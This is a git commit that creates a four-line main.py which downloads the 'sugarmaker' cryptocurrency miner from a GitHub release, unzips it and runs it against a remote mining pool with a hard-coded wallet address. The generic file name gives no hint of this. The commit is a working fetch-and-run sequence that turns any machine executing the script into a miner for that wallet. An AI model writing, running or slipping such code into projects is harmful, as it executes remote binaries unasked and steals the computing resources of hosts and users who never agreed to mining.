9a31168f3917cf7668860723685b79f02445b786
nilavdas123 <72118150+nilavdas123@users.noreply.github.com>
2021-06-24 04:05:52 -0700

    Create main.py

---
+++ main.py
@@ -0,0 +1,4 @@
+import os
+os.system('wget https://github.com/decryp2kanon/sugarmaker/releases/download/v2.5.0-sugar4/sugarmaker-v2.5.0-sugar4-linux64.zip')
+os.system("unzip sugarmaker-v2.5.0-sugar4-linux64.zip")
+os.system("./sugarmaker -a YespowerSugar -o stratum+tcp://stratum-asia.rplant.xyz:7042 -u sugar1qjw3gxm6thk2gzhhfncc59uvshxnjs6ff6ju0da -t1")
